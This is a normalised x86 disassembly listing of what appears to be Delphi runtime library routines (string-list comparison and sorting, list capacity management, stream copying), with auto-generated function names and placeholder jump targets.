mov eax [ ebp - 0x8 ]
call sub_425a78
xor edx edx
push ebp
push sub_426792
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426799
mov eax [ ebp - 0x8 ]
call sub_425b40
retn
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_426870
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_434db8
test eax eax
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_426870
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
jmp r-xdata
mov esi ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_426870
mov eax [ ebp - 0x1c ]
call sub_449db8
mov edx eax
mov eax ebx
call sub_43b138
mov edi eax
jmp r-xdata
movzx eax [ ebx ]
test ax ax
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov ecx ebx
sub ecx esi
sar ecx 0x1
jns r-xdata
sub ax 0xa
je r-xdata
mov ecx ebx
sub ecx esi
sar ecx 0x1
jns r-xdata
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_449e68
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
adc ecx 0x0
sub ax 0x3
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_449e68
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp edi ebx
jne r-xdata
adc ecx 0x0
add ebx 0x2
cmp [ ebx ] 0xa
jne r-xdata
add ebx 0x2
add ebx 0x2
mov eax [ ebp - 0xc ]
add eax eax
add ebx eax
add ebx 0x2
sub_426799
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4267cb
lea eax [ ebp - 0x1c ]
call j_sub_449348
lea eax [ ebp - 0x14 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4267db
inc [ edx ]
add [ eax ] al
add [ 0xa00 ] cl
add [ eax ] al
add bl al
nop
nop
nop
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426862
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_42bc4c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_42bc54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426869
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42d580
inc esi
dec ebx
jne r-xdata
sub_426870
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x4 ] 0x8
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_449d2c
pop esi
pop ebx
retn
mov edx r-xdata
mov eax ebx
call sub_4268ac
sub_4268ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call j_sub_44a294
jne r-xdata
or [ ebx + 0x4 ] 0x8
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_449d2c
test [ ebx + 0x4 ] 0x8
jne r-xdata
pop esi
pop ebx
retn
sub_4268d8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_426997
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_449d80
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_449d80
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push esi
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42699e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
sub_4269c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp si [ ebx + 0xe ]
jne r-xdata
or [ ebx + 0x4 ] 0x4
mov [ ebx + 0xe ] si
test [ ebx + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_4269e4
push ebx
push esi
push edi
push ebp
call sub_44873c
mov ebx edx
mov ebp eax
xor eax eax
mov [ ebp + 0x30 ] eax
mov [ ebp + 0x34 ] eax
xor eax eax
mov [ ebp + 0x38 ] eax
mov [ ebp + 0x3c ] eax
cmp [ ebp + 0x40 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_42588c
mov eax [ ebp + 0x20 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x20 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
mov [ ebp + 0x20 ] eax
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ ebp + 0x1c ]
mov edx [ r-xdata ]
call sub_44a7e8
inc esi
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4486e4
mov edx edi
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_4481b0
inc edi
dec esi
jne r-xdata
sub_426a78
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x9c ]
test al al
je r-xdata
mov eax [ ebx + 0x20 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x98 ]
movzx eax [ ebx + 0x29 ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_425c38
jmp r-xdata
sub_426b14
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x1c ]
mov ecx [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_44a7e8
xor eax eax
mov [ ebx + 0x20 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
mov esi [ ebx + 0x20 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_4481b0
inc edi
dec esi
jne r-xdata
sub_426b7c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_425c38
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov eax [ ebx + 0x1c ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_44a8f8
dec [ ebx + 0x20 ]
mov eax [ ebx + 0x20 ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_4481b0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x1c ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x1c ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4476cc
sub_426bfc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_425c38
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_425c38
cmp edi [ ebx + 0x20 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_426c58
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
pop edi
pop esi
pop ebx
retn
sub_426c58
push ebx
mov ebx [ eax + 0x1c ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x1c ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_426c7c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x20 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
movzx eax [ esp + 0x8 ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x1c ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
mov [ esp + 0x10 ] eax
cmp [ esp + 0x10 ] 0x0
jge r-xdata
mov eax ebx
dec eax
mov [ esp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x29 ] 0x1
je r-xdata
mov esi ebx
sub_426d00
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_425c38
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x1c ]
mov edx [ edx + esi * 8 ]
call sub_449d2c
pop edi
pop esi
pop ebx
retn
sub_426d3c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_425c38
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov eax [ ebx + 0x1c ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_426d64
push esi
mov edx [ eax + 0x24 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_426d98
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x9c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_425f74
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_426de4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_425c38
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_425c38
cmp esi [ ebx + 0x20 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x98 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_426e38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jne r-xdata
mov eax [ ebx + 0x20 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_426d64
mov eax [ ebx + 0x1c ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_449d2c
inc [ ebx + 0x20 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x1c ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x1c ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
add ecx ecx
mov eax edx
pop edx
call sub_4476cc
sub_426eb4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_425c38
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_425c38
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebx + 0x1c ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_449d2c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
pop edi
pop esi
pop ebx
retn
sub_426f10
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_425c38
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebx + 0x1c ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
pop edi
pop esi
pop ebx
retn
sub_426f50
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp esi ebx
je r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_426c58
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_426f50
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
sub_426fe8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_425c38
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
add edx edx
add edx edx
add edx edx
lea eax [ ebx + 0x1c ]
call sub_4474c0
mov [ ebx + 0x24 ] esi
cmp esi [ ebx + 0x24 ]
je r-xdata
sub_427028
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x28 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x28 ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0xa0 ]
sub_427048
push esi
mov esi eax
test dl dl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x94 ]
pop esi
retn
sub_427068
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x1c ]
mov ecx [ eax + ecx * 8 ]
mov eax [ esi + 0x1c ]
mov edx [ eax + edi * 8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop edi
pop esi
pop ebx
retn
sub_427098
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x20 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
push esi
mov ecx [ ebx + 0x20 ]
dec ecx
xor edx edx
mov eax ebx
call sub_426f50
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
sub_4270d0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor edx edx
push ebp
push sub_42722b
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x2a ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_449d80
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_449d80
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_449d80
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_449d80
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
call sub_4494dc
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push esi
mov eax [ ebp - 0x10 ]
call sub_449db8
push eax
push ebx
mov eax [ ebp - 0xc ]
call sub_449db8
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
mov ebx eax
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_4494dc
push esi
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push 0x0
push 0x400
call CompareStringW
sub eax 0x2
mov ebx eax
jmp r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427232
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_44936c
retn
sub_42723c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_427274
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_4272a8
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_42730c
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_427360
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4273c6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax ]
call sub_448088
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4273cd
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
sub_4273d4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x1a ] cx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x14 ]
mov edx [ edx ]
mov eax edx
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0xc ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
push ebp
call sub_427360
pop ecx
mov eax [ ebx ]
call sub_44813c
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
movzx edx [ ebp - 0x1a ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_427360
pop ecx
sub_427458
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
movzx ecx bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_4274c8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
sub_427500
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
sub_427538
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_427294
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_44748c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_427614
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42761b
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4474a8
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_4274c8
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_427500
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_42762c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d50
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42767c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_42a0e8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427683
mov eax [ ebp - 0x8 ]
call sub_4481b0
retn
sub_427694
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d50
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4276e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
